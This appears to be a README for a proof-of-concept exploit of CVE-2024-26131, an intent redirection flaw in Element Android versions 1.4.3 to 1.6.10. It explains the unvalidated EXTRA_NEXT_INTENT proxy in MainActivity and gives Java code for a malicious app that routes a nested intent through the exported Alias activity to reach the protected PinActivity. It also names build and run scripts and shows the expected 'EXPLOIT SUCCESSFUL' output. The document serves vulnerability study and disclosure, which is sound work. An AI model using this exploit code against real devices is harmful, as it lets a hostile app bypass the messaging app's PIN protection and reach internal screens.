# CVE-2024-26131 - Element Android Intent Redirection Exploit

## Overview

This exploit demonstrates CVE-2024-26131, a high-severity (CVSS 7.8) intent redirection vulnerability in Element Android versions 1.4.3 through 1.6.10. The vulnerability allows malicious applications to bypass Android's security model and access Element's internal, protected activities.

## The Vulnerability

### What is Intent Redirection?

Android uses an "intent" system for inter-app communication. Activities can be marked as:
- `exported="true"` - Other apps can access them
- `exported="false"` - Only the same app can access them (internal/protected)

Element Android contains vulnerable code in `MainActivity.kt`:

```java
Intent nextIntent = getIntent().getParcelableExtra("EXTRA_NEXT_INTENT");
if (nextIntent != null) {
    startActivity(nextIntent);  // No validation!
}
```

This code acts as an "intent proxy" - it blindly launches whatever intent is passed to it without checking if it's safe.

### Element's Security Architecture

```
Element App Structure:
├── Alias Activity (exported="true")    ← External apps can access
├── MainActivity (exported="false")     ← Should be internal only
└── PinActivity (exported="false")      ← Should be internal only
```

**Normal Security:** External apps should only be able to access the `Alias` activity.

## How the Exploit Works

### The Attack Chain

```
Malicious App → Element Alias → Element MainActivity → Element PinActivity
   (external)     (exported)      (intent proxy)        (internal/protected)
```

### Step-by-Step Breakdown

1. **Malicious app creates nested intent:**
   ```java
   // Target: What we want to access (normally forbidden)
   Intent targetIntent = new Intent();
   targetIntent.setClassName("im.vector.app.debug", "im.vector.app.features.pin.PinActivity");
   
   // Wrapper: Uses Element's exported entry point
   Intent wrapperIntent = new Intent();
   wrapperIntent.setClassName("im.vector.app.debug", "im.vector.application.features.Alias");
   wrapperIntent.putExtra("EXTRA_NEXT_INTENT", targetIntent);
   
   startActivity(wrapperIntent);
   ```

2. **Android allows access to Alias:**
   - Alias is `exported="true"`, so external apps can call it

3. **Alias forwards to MainActivity:**
   - Internal forwarding within Element (allowed)

4. **MainActivity processes malicious payload:**
   - Extracts our `EXTRA_NEXT_INTENT`
   - Launches `PinActivity` without validation

5. **PinActivity launches successfully:**
   - Android sees this as internal Element activity calling another Element activity
   - This bypasses authentication

### Why This Bypasses Security

- **Direct access:** `Malicious App → PinActivity` = BLOCKED
- **Indirect access:** `Malicious App → Alias → MainActivity → PinActivity` = ALLOWED

Android doesn't realize that MainActivity is acting as a proxy for the malicious app.

## Why We Create a Separate Malicious App

### Android Security Model Limitation

We cannot exploit this vulnerability using simple ADB commands because:

1. `EXTRA_NEXT_INTENT` expects a real Android `Intent` object, not a string
2. ADB can only send simple strings, not nested objects
3.  Need to demonstrate how an actual malicious app would exploit this

### Root Cause
Element's MainActivity acts as an unvalidated intent proxy, allowing external applications to access internal activities through intent redirection.

## Usage

### Building and Running the Exploit

```bash
# Build malicious APK and execute exploit
./exploit.sh

# Verify if exploit succeeded
./verify.sh
```

### Expected Results

**Success:**
```
Current focused activity: im.vector.app.features.pin.PinActivity

EXPLOIT SUCCESSFUL
==================
Element PinActivity accessed via intent redirection
Security boundary bypassed
```

**This confirms:**
- External app successfully accessed internal Element activity
- Android's security model was bypassed
- CVE-2024-26131 is exploitable